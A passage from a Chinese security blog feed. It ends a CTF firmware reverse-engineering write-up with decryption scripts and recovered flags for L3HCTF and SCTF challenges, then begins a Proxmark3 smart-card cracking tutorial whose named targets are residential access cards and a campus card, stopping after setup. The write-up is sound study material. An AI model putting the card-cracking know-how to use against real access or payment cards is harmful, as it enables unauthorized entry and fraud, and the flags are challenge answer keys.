class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;defs.h&quot;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0x1</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x1</span> &#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encvin[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">initfunc</span><span class="hljs-params">(<span class="hljs-type">char</span>* from_addr, _BYTE* to_addr, <span class="hljs-type">int</span> start_index)</span><br>&#123;<br>    _BYTE* v3; <span class="hljs-comment">// r4</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// r2</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// t1</span><br>    <span class="hljs-type">int</span> v6; <span class="hljs-comment">// r3</span><br>    <span class="hljs-type">int</span> v7; <span class="hljs-comment">// t1</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// r2</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// t1</span><br>    <span class="hljs-type">char</span> v10; <span class="hljs-comment">// t1</span><br><br>    v3 = &amp;to_addr[start_index];<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        v5 = *from_addr++;<br>        v4 = v5;<br>        v6 = v5 &amp; <span class="hljs-number">0xF</span>;<br>        <span class="hljs-keyword">if</span> ((v5 &amp; <span class="hljs-number">0xF</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            v7 = (<span class="hljs-type">unsigned</span> __int8)*from_addr++;<br>            v6 = v7;<br>        &#125;<br>        v8 = v4 &gt;&gt; <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">if</span> (!v8)<br>        &#123;<br>            v9 = (<span class="hljs-type">unsigned</span> __int8)*from_addr++;<br>            v8 = v9;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (--v6)<br>        &#123;<br>            v10 = (<span class="hljs-type">unsigned</span> __int8)*from_addr++;<br>            *to_addr++ = v10;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (--v8)<br>            *to_addr++ = <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">while</span> (to_addr &lt; v3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>    initfunc(data, encvin, <span class="hljs-number">0x194</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后seed转换端序，tea加密seed后再次转换端序得到Key，使用Key对密文rc4解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br>key = [<span class="hljs-number">0x00000123</span>, <span class="hljs-number">0x00004567</span>, <span class="hljs-number">0x000089AB</span>, <span class="hljs-number">0x0000CDEF</span>]<br><br>DELTA = <span class="hljs-number">0x9E3779B9</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_enc</span>(<span class="hljs-params">v0, v1, key</span>):<br>_<span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>_<span class="hljs-built_in">sum</span> += <span class="hljs-number">0x9E3779B9</span><br>_<span class="hljs-built_in">sum</span> &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>v0 += (key[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span> * v1) ^ (v1 + _<span class="hljs-built_in">sum</span>) ^ (key[<span class="hljs-number">1</span>] + (v1 &gt;&gt; <span class="hljs-number">5</span>))<br>v0 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>v1 += (key[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * v0) ^ (v0 + _<span class="hljs-built_in">sum</span>) ^ (key[<span class="hljs-number">3</span>] + (v0 &gt;&gt; <span class="hljs-number">5</span>))<br>v1 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br><span class="hljs-keyword">return</span> v0, v1<br><br><br>b = struct.pack(<span class="hljs-string">&#x27;&lt;2I&#x27;</span>, <span class="hljs-number">0x44332211</span>, <span class="hljs-number">0x88776655</span>)<br>v0, v1 = struct.unpack(<span class="hljs-string">&#x27;&gt;2I&#x27;</span>, b)<br><br>v0, v1 = tea_enc(v0, v1, key)<br>b = struct.pack(<span class="hljs-string">&#x27;&gt;2I&#x27;</span>, v0, v1)<br><br>arc4 = ARC4.new(b)<br>a = arc4.encrypt(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x14</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x41</span>,<br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xD1</span>]))<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#W0L000043MB541337</span><br></code></pre></td></tr></table></figure><h2 id="2024SCTF-easymcu"><a href="#2024SCTF-easymcu" class="headerlink" title="2024SCTF easymcu"></a>2024SCTF easymcu</h2><p>题目描述</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">小明从车机主控中提取出来固件 mcu.s19文件。车机主控的PCBA如图PCBA.jpg。用户使用串口助手xcom输入一串<span class="hljs-built_in">flag</span>后，在串口助手中返回了一些数据，如图xcom.jpg所示。求<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>PCBA.jpg</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/PCBA.jpg" alt="PCBA"></p><p>xcom.jpg</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/xcom.jpg" alt="xcom"></p><p>通过CPU的丝印得知该固件指令集是32位TriCore以及相关参数</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/44.png" alt="44"></p><h3 id="Motorola-Hex文件格式"><a href="#Motorola-Hex文件格式" class="headerlink" title="Motorola Hex文件格式"></a>Motorola Hex文件格式</h3><p>类似intel hex的烧录文件格式，由Motorola制定，也叫S-Record。该格式文件的后缀有**.s19, .s28, .s37, .s, .s1, .s2, .s3, .sx, .srec, .mot**等。这里直接用hexview查看和转换，比命令行工具直观且方便多了。</p><p>如图，直接帮我们分析各个区块的基址和大小。</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/45.png" alt="45"></p><p>导出为bin文件或其它格式</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/46.png" alt="46"></p><p>其实不转换也没关系，ida和ghidra都能识别intel hex和motorola hex，转换成bin反而麻烦，需要手动设置rom基址。</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>tricore指令集的反编译需要使用ghidra，因为ida只能反汇编，无法反编译看伪c。</p><p><code>mcu.19</code>用ghidra打开，设置好文件格式和指令集如下，然后用CodeBrower分析，打开后没有分析出函数，Ctrl + A再按D自动反编译所有机器码。</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/47.png" alt="47"></p><h3 id="分析代码，解密数据"><a href="#分析代码，解密数据" class="headerlink" title="分析代码，解密数据"></a>分析代码，解密数据</h3><p>官方wp给出了两种思路：</p><p>1、从波特率入手。题目给的XCOM图片里显示波特率是115200，在串口初始化函数<code>UART init</code>的配置数据中包含了波特率。我们用ida或ghidra的search功能在固件中搜索波特率标量，追踪交叉引用可以找到UART串口初始化函数，继而找到该串口的通信加密逻辑。</p><p>2.作者用了标准AES加密，可以通过加密特征定位到加密函数。</p><p>显然第1种思路更科学，第2种思路偏”CTF”，我们采用第一种思路进行分析。</p><p>ida搜索标量 ： Search-&gt;Immediate value或Sequence of bytes</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/48.png" alt="48"></p><p>ghidra搜索标量</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/49.png" alt="49"></p><p>由于ida不能看伪c，我们用ghidra分析，找到波特率常量位置</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/50.png" alt="50"></p><p>交叉引用到UART_init再到主函数，一般while里就是MCU循环处理的部分。</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/51.png" alt="51"></p><p>进入MCU循环函数</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/52.png" alt="52"></p><p>循环函数操作：获取串口输入 -&gt; AES加密 -&gt; 对加密后的每一位进行位运算(循环左移、异或下一位、取反) -&gt; 在串口输出加密数据</p><p> <img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/53.png" alt="53"></p><p>AES_KEY</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/54.png" alt="54"></p><p>算法分析完成，写脚本解密，这里直接贴官方脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val, shifts</span>):<br>    <span class="hljs-keyword">return</span> ((val &gt;&gt; shifts) &amp; <span class="hljs-number">0xff</span>) | ((val &lt;&lt; (<span class="hljs-number">8</span> - shifts)) &amp; <span class="hljs-number">0xFF</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes</span>(<span class="hljs-params">ciphertext, key</span>):<br>    cipher = AES.new(<span class="hljs-built_in">bytes</span>(key), AES.MODE_ECB)<br>    decrypted = cipher.decrypt(<span class="hljs-built_in">bytes</span>(ciphertext))<br>    <span class="hljs-keyword">return</span> decrypted<br>hex_array=[<span class="hljs-number">0x63</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xd8</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_array))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_array) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>    val = (~hex_array[i]) &amp; <span class="hljs-number">0xff</span><br>    val ^= hex_array[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(hex_array)]<br>    val = ror(val, <span class="hljs-number">3</span>)<br>    hex_array[i] = val<br>key = [<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xed</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xf3</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x4e</span>]<br>decrypted_data = decrypt_aes(hex_array, key)<br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> decrypted_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后的数据：&quot;</span>)<br><span class="hljs-built_in">print</span>(decrypted_string)<br><span class="hljs-comment">#Flag: SCTF&#123;Wlc_t0_the_wd_oF_IOT_s3cur&#125;</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>一般来说异构程序的反编译用ghidra，但笔者感觉还是ida顺手，9.0的IDA已经支持MIPS等普通的异构了。当然更冷门的指令集架构比如英飞凌的TriCore还是得用ghidra</li><li>逆向固件打包算法以及固件中的算法时，结合数据HEX对数据结构进行猜测非常重要，这些需要经验、直觉以及冷静的观察</li><li>mcu裸机固件逆向思路:获取芯片型号查datasheet -&gt; 获取指令集架构 -&gt; 获取memory的映射结构，包括:rom基址、程序入口地址、ram基址、外设接口地址、各类总线地址等信息 -&gt; 在反汇编工具中创建正确的内存映射并反编译</li><li>对于bin、hex、s19等mcu烧录文件的格式转换，可以使用objcopy、SRecord等命令行工具，但是更推荐使用专业工具<a href="https://gitcode.com/open-source-toolkit/6b787">Hexview</a></li><li>ida和ghidra具有强大的搜索功能，除了字符串，还能搜索指令、标量、字节序列等</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/f_jjL34MEaXKaNjAhqZ6YA">2024 L3HCTF writeup by Arr3stY0u</a></p><p><a href="https://xz.aliyun.com/t/13630?time__1311=GqmxuD9QD=iteGNDQiiQGkQbOkGQPHDc7oD">2024 L3HCTF Reverse WP by WM</a></p><p><a href="https://mp.weixin.qq.com/s/BRC8-ufEowYkPmuF65iJpQ">SCTF 2024 writeup by Arr3stY0u</a></p><p><a href="https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef">2024SCTF 官方wp</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg5OTUzNDY2Nw==&mid=2247484351&idx=1&sn=1a28c6baf473829b19bd2cc4992bd752&chksm=c1a154f6c9957c6f0ec29a9d139598afd6d56a31ae55c9d9deab543a8c810253586788cbb9e9&mpshare=1&scene=23&srcid=1001ghiPHORztFCWZYpppfOp&sharer_shareinfo=f76b8b69af4cfafe5da55fbff445acdc&sharer_shareinfo_first=f76b8b69af4cfafe5da55fbff445acdc#rd">Spirit战队 2024 SCTF wp</a></p><p><a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-9">[星盟] SCTF 2024 Writeup</a></p><p><a href="https://xuanxuanblingbling.github.io/iot/2020/07/08/stm32/">[Clang裁缝店] SCTF 2020 Password Lock Plus 入门STM32逆向</a></p><p><a href="https://www.52pojie.cn/thread-1732800-1-1.html">[吾爱破解] 采用IDA Pro 分析878UVII radio对讲机固件初步研究</a></p><p><a href="https://blog.csdn.net/weixin_51431342/article/details/125505941">芯片，SOC和MCU区别；裸机和带系统</a></p><p><a href="https://www.hyun.tech/archives/mcu%E5%8D%95%E7%89%87%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8">MCU 单片机固件逆向分析入门</a></p><p><a href="https://gorgias.me/2022/08/15/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E7%9A%84%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/">固件逆向的通用技巧</a></p><p><a href="https://github.com/driftregion/iso14229/tree/v0.7.1">ISO14229-uds源码</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>固件逆向</tag>
      
      <tag>H3C</tag>
      
      <tag>PPPoE</tag>
      
      <tag>STM32</tag>
      
      <tag>裸机固件</tag>
      
      <tag>UDS</tag>
      
      <tag>Infineon车机固件</tag>
      
      <tag>UART</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能卡破解实战之pm3初探</title>
    <link href="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/"/>
    <url>/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="智能卡破解实战之pm3初探"><a href="#智能卡破解实战之pm3初探" class="headerlink" title="智能卡破解实战之pm3初探"></a>智能卡破解实战之pm3初探</h1><p>也算是考古了，根据网上搜索到的资料来看智能卡破解这类技术的热度高峰在2015-2020年。不过之后似乎也没什么更新，CPU卡的破解依然是个难题。</p><h2 id="pm3简介"><a href="#pm3简介" class="headerlink" title="pm3简介"></a>pm3简介</h2><p>全称<strong>Proxmark3</strong></p><p>功能强大的专业智能卡破解工具，简称pm3，基于FPGA和ARM处理器共同运行的设计，包括初版、easy、rdv2、rdv4、EVO等版本，还有基于pm3的ICOPY-X手持机。easy版是rdv2的阉割版，功能有所受限，国内大多是easy或rdv2改版,最常见的是龙达的512版(easy改版)。</p><p>功能：密码嗅探；读写125&#x2F;134KHz的ID卡和13.56MHz的IC卡，国内的龙达终极版还支持250K、375K、500K频率的ID卡。</p><p>购买建议：对于初学者，闲鱼上买国内改版(如龙达)，价格在150左右；对于想深入研究或有 实际业务需求的人，购买rdv4，官网售价300欧元左右。国内的pm3 + 变色龙一体机不建议购买。想玩变色龙的话在闲鱼单买也可以买到，价格在100以内。</p><ul><li>pm3固件分类</li></ul><p>官方固件、RRG&#x2F;Iceman固件、ProxBrute固件、PM3 Easy固件</p><p>各个固件的github仓库地址在Reference</p><ul><li>GUI软件</li></ul><p><a href="https://pan.baidu.com/s/1mNdhP02ZovVvlKHjdA54sA">Proxmark3_EASY_GUI</a>，提取码6812</p><p><a href="https://github.com/burma69/PM3UniversalGUI">PM3 Universal GUI</a>，官方github仓库的Release只有一个exe，还需要自己配置client，比较麻烦。笔者有配置好的版本 -&gt; <a href="https://pan.baidu.com/s/1MYEqPiwzG0VAE-iYZjNcmQ">传送门</a>，提取码9413，仅支持原始命令</p><p><a href="https://github.com/XMTongXie/proxmark3">Proxmark Tool</a>，仅支持原始命令</p><p><a href="https://github.com/wh201906/Proxmark3GUI">Proxmark3GUI</a>(此工具的注意事项:1.路径不能有中文;2.龙达512Pm3只能用Release中的<code>Vx.x.x-win64-official-vx.x.x.7z</code>版本，其它的rrg_other需要刷冰人固件)</p><p>TIPS：固件和Client不匹配可能导致某些功能异常，比如<code>hw tune</code>检查天线功能时出现非正常数字</p><ul><li>功能示意图(龙达512版)</li></ul><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/1.png" alt="1"></p><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><ul><li>安装驱动</li></ul><p><a href="https://github.com/RfidResearchGroup/proxmark3/tree/master/driver">驱动下载</a>，文件名为<code>proxmark3.inf</code></p><p>驱动是通用的，所有GUI软件装一次即可</p><p>安装驱动文件前需要<code>禁用驱动安装强制签名</code>，方法–&gt;<a href="https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html">传送门</a></p><p>设备管理器  -&gt; 端口(COM和LPT) -&gt; 右键PM3接口对应的COM口，此时只显示USB串行设备 -&gt; 更新驱动程序 -&gt; 选择浏览我的电脑以查找驱动程序</p><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/2.png" alt="2"></p><p>选择让我从计算机上的可用驱动程序列表中选取</p><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/3.png" alt="3"></p><p>选择从磁盘安装，选中之前下载的驱动文件</p><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/4.png" alt="4"></p><p>驱动安装成功后显示为Proxmark3</p><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/5.png" alt="5"></p><ul><li>连接设备</li></ul><p>连接PM3的USB接口和电脑的USB接口，注意是PM3上方的接口，不是侧边的。</p><ul><li>打开GUI软件进行操作</li></ul><h2 id="破解实战"><a href="#破解实战" class="headerlink" title="破解实战"></a>破解实战</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">硬件:Pm3龙达512版</span><br><span class="hljs-section">软件:Proxmark3_EASY_GUI</span><br><span class="hljs-section">目标:某小区门禁卡1、某小区门禁卡2、某校园一卡通</span><br></code></pre></td></tr></table></figure><p>GUI界面如图，有很多基于原生指令进行封装后功能按钮，输入help可以查看原生指令</p><p><img src="/2024/11/06/%E6%99%BA%E8%83%BD%E5%8D%A1%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98%E4%B9%8Bpm3%E5%88%9D%E6%8E%A2/6.png" alt="6"></p><h3 id="某小区门禁卡1-ID卡"><a href="#某小区门禁卡1-ID卡" class="headerlink" 